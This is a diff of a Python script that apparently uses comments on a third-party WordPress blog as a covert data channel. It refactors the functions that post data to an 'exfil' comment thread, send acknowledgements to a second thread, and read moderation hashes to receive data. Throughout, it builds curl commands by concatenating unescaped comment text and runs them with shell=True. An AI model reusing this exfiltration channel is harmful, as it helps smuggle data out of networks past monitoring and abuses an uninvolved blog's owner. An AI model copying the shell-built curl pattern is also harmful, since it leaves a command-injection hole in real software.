@@ -82,7 +82,7 @@ def get_post_id(blog_url, channel_url):
     
     return -1
 
-def submit_comment(blog_url, post_id, comment_str):
+def submit_comment(blog_url, post_id, comment):
     curl_command = "curl '" + blog_url
     curl_command += """wp-comments-post.php' -H 'Connection: keep-alive' \
       -H 'Cache-Control: max-age=0' \
@@ -103,7 +103,7 @@ def submit_comment(blog_url, post_id, comment_str):
       -H 'Accept-Language: en-US,en;q=0.9' \
       --data-raw 'author=TestName&email=test%40email.com&url=&submit=Post+Comment&comment_post_ID="""
     curl_command += str(post_id) + "&comment_parent=0&comment="
-    curl_command += comment_str + "' --compressed -Ls -w \"%{http_code},%{url_effective}\"" # -o /dev/null"
+    curl_command += comment.comment + "' --compressed -Ls -w \"%{http_code},%{url_effective}\"" # -o /dev/null"
     curl_output = subprocess.check_output(curl_command, shell=True)
     return CommentResponse(curl_output.decode())
 
@@ -188,23 +188,25 @@ def get_moderation_hash_from_url(url):
     else:
         return None
 
-def send_data(channel, data, send_config):
+def send_data(channel, comment, send_config):
     while True:
         delay_to_timeslot(send_config.send_time_slot)
 
-        log_print("[INFO] send_data: Sending data " + str(data.comment_id) + " at " + str(datetime.datetime.now().time()), 2)
+        log_print("[INFO] send_data: Sending data " + str(comment.comment_id) + " at " + str(datetime.datetime.now().time()), 2)
 
-        response = submit_comment(channel.target_blog, channel.exfil_channel_id, data.comment)
+        response = submit_comment(channel.target_blog, channel.exfil_channel_id, comment)
         if response.html_response_code == 409:
             log_print("## " + str(response.html_response))
-            log_print("## " + str(data.comment_id) + ", " + str(data.comment))
+            log_print("## " + str(comment.comment_id) + ", " + str(comment.comment))
             
         log_print("## send_data: " + str(response.html_response_code) + ", " + str(response.url) + ", " + str(response.moderation_hash), 2)
 
         if send_config.confirm_time_slot:
             delay_to_timeslot(send_config.confirm_time_slot)
-            
-            response = response = submit_comment(channel.target_blog, channel.ack_channel_id, data.comment_id)
+
+            ack_comment = comment
+            ack_comment.comment = comment.comment_id
+            response = response = submit_comment(channel.target_blog, channel.ack_channel_id, ack_comment)
             if "Duplicate" in response.html_response:
                 # If it's duplicated, that means that the server successfully got the comment.
                 log_print("[INFO] send_data: Comment submitted and confirmed.", 1)
@@ -215,16 +217,19 @@ def send_data(channel, data, send_config):
             break
 
 def get_current_unapproved_index(channel):
-    random_string = generate_random_string(10)
-    comment_to_send = random_string + ": get_current_unapproved_index"
-    response = submit_comment(channel.target_blog, channel.exfil_channel_id, comment_to_send)
-
+    comment = Comment()
+    comment.sender = generate_random_sender()
+    comment.comment_id = ""
+    comment.comment = generate_random_string(10) + ": get_current_unapproved_index"
+    response = submit_comment(channel.target_blog, channel.exfil_channel_id, comment)
     return response.unapproved_index
 
 def get_moderation_hash_at_current_time(channel):
-    random_string = generate_random_string(10)
-    response = submit_comment(channel.target_blog, channel.exfil_channel_id, random_string + ": Getting_moderation_hash")
-
+    comment = Comment()
+    comment.sender = generate_random_sender()
+    comment.comment_id = ""
+    comment.comment = generate_random_string(10) + ": Getting_moderation_hash"
+    response = submit_comment(channel.target_blog, channel.exfil_channel_id, comment)
     return response.moderation_hash, response.unapproved_index
 
 def receive_data(channel, num_of_receivers, recv_config):
